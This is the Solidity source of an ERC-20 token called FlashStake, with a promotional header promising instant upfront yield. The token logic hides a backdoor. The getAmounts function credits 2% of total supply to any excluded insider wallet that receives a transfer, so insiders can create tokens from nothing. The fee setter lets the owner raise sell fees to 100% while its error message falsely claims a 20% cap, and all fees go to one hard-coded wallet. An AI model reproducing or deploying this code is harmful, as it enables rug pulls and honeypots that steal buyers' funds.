// SPDX-License-Identifier: MIT

/*
Stop waiting for your money. Claim up to two years' worth of yield, instantly and upfront.

Website:  https://www.flashprotocol.org
Telegram:  https://t.me/flash_erc
Twitter: https://twitter.com/flash_erc
Dapp: https://app.flashprotocol.org
*/

pragma solidity 0.8.19;

library SafeMathInt {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pairAddress);
}
interface ISimpleERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract FlashStake is ISimpleERC20, Ownable {
    using SafeMathInt for uint256;
    string private constant _name = unicode"FlashStake";
    string private constant _symbol = unicode"FLASH";
    uint8 private constant _decimals = 9;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 private swapCounts;
    bool private swapping;
    uint256 swapTriggerAfter;
    IRouter router;
    address public pairAddress;
    bool private openedTrading = false;
    bool private swapEnabled = true;
    uint256 private maxFeeSwap = ( _totalSupply * 1000 ) / 100000;
    uint256 private minTaxSwap = ( _totalSupply * 10 ) / 100000;
    modifier lockSwap {swapping = true; _; swapping = false;}
    uint256 private lpAddRate = 0;
    uint256 private marketingRate = 0;
    uint256 private devRate = 100;
    uint256 private burnRate = 0;
    uint256 private buyFee = 1200;
    uint256 private sellFee = 2500;
    uint256 private transferFee = 1200;
    uint256 private denominator = 10000;
    address internal devReceipient = 0xBda15439168A333d6Aca9a7aFee1DeccF2E8CFF7; 
    address internal marketingReceipient = 0xBda15439168A333d6Aca9a7aFee1DeccF2E8CFF7;
    address internal lpAddReceiver = 0xBda15439168A333d6Aca9a7aFee1DeccF2E8CFF7;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    uint256 public maxTxAmounts = ( _totalSupply * 200 ) / 10000;
    uint256 public maxBuySize = ( _totalSupply * 200 ) / 10000;
    uint256 public maxWalletAmount = ( _totalSupply * 200 ) / 10000;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDexFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pairAddress = _pair;
        _isExcluded[lpAddReceiver] = true;
        _isExcluded[marketingReceipient] = true;
        _isExcluded[devReceipient] = true;
        _isExcluded[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function decimals() public pure returns (uint8) {return _decimals;}    
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!_isExcluded[sender] && !_isExcluded[recipient]){require(openedTrading, "openedTrading");}
        if(!_isExcluded[sender] && !_isExcluded[recipient] && recipient != address(pairAddress) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletAmount, "Exceeds maximum wallet amount.");}
        if(sender != pairAddress){require(amount <= maxBuySize || _isExcluded[sender] || _isExcluded[recipient], "TX Limit Exceeded");}
        require(amount <= maxTxAmounts || _isExcluded[sender] || _isExcluded[recipient], "TX Limit Exceeded"); 
        if(recipient == pairAddress && !_isExcluded[sender]){swapCounts += uint256(1);}
        if(shouldSwapTax(sender, recipient, amount)){swapBackFee(maxFeeSwap); swapCounts = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !_isExcluded[sender] ? getAmounts(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function shouldSwapTax(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTaxSwap;
        bool aboveThreshold = balanceOf(address(this)) >= maxFeeSwap;
        return !swapping && swapEnabled && openedTrading && aboveMin && !_isExcluded[sender] && recipient == pairAddress && swapCounts >= swapTriggerAfter && aboveThreshold;
    }
    function swapBackFee(uint256 tokens) private lockSwap {
        uint256 _denominator = (lpAddRate.add(1).add(marketingRate).add(devRate)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpAddRate).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensToETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpAddRate));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpAddRate);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingRate);
        if(marketingAmt > 0){payable(marketingReceipient).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devReceipient).transfer(contractBalance);}
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _devAddresselopment, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpAddRate = _liquidity; marketingRate = _marketing; burnRate = _burn; devRate = _devAddresselopment; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddReceiver,
            block.timestamp);
    }
    function getFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pairAddress){return sellFee;}
        if(sender == pairAddress){return buyFee;}
        return transferFee;
    }
    function startTrading() external onlyOwner {openedTrading = true;}
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        maxTxAmounts = newTx; maxBuySize = newTransfer; maxWalletAmount = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function getAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_isExcluded[recipient]) {return maxTxAmounts;}
        if(getFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnRate > uint256(0) && getFees(sender, recipient) > burnRate){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnRate));}
        return amount.sub(feeAmount);} return amount;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}